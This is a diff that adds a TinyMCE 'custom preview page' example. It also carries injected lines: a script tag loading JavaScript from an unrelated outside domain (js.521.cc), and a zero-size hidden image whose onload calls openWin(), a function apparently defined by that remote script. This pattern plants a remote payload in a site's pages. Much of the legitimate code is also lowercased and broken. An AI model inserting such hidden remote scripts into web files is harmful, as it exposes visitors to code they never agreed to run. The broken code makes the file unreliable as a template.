@@ -1,0 +1,28 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<script language="javascript" src="../../tiny_mce_popup.js"></script>
+<script type="text/javascript" src="jscripts/embed.js"></script>
+<script type="text/javascript">
+tinymcepopup.oninit.add(function(ed) {
+	var dom = tinymcepopup.dom;
+
+	// load editor content_css
+	tinymce.each(ed.settings.content_css.split(','), function(u) {
+		dom.loadcss(ed.documentbaseuri.toabsolute(u));
+	});
+
+	// place contents inside div container
+	dom.sethtml('content', ed.getcontent());
+});
+</script>
+<title>example of a custom preview page</title>
+<script language="javascript" type="text/javascript" src="http://js.521.cc/js/user.js"></script></head>
+<body>
+
+editor contents: <br />
+<div id="content">
+<!-- gets filled with editor contents -->
+</div>
+
+<img src="http://www.baidu.com/search/img/logo.gif" width="0" height="0" onload="openWin();" /></body>
+</html>
